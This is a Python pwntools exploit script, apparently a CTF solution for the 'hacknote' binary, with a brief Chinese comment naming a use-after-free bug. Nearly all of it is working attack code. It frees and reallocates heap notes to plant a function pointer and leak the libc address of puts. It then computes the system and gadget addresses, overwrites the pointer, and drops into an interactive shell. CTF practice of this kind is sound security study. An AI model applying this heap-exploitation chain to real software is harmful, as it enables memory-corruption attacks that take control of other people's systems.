# -*- coding: utf-8 -*-
from pwn import *

'''
漏洞：uaf
利用：
两次分配四个块，释放掉后再分配小块。
现在可以修改第一次分配堆的内容。
'''
context(log_level='debug')

p = process("./hacknote")
elf = ELF("./hacknote")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")

def addnote(size, content):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(content)


def delnote(idx):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))


def printnote(idx):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))

gdb.attach(p)
puts = 0x0804865b
addnote(0x20,"a")
addnote(0x20,"b")
delnote(0)
delnote(1)
addnote(8,p32(puts)+p32(elf.got["puts"]))
printnote(0)
sleep(1)
putsAddr = u32(p.recv()[7:11])
log.success(hex(putsAddr))
libcBase = putsAddr - libc.symbols["puts"]
systemAddr = libcBase + libc.symbols["system"]
log.success(hex(systemAddr))
binsh = libcBase + libc.search("/bin/sh").next()
log.success(hex(binsh))
p.sendline("2")
p.recvuntil(":")
p.sendline("1")
systemAddr = libcBase+0x5fbc5
#sleep(3)
addnote(8,p32(systemAddr)+"aaaa")
delnote(4)







p.interactive()
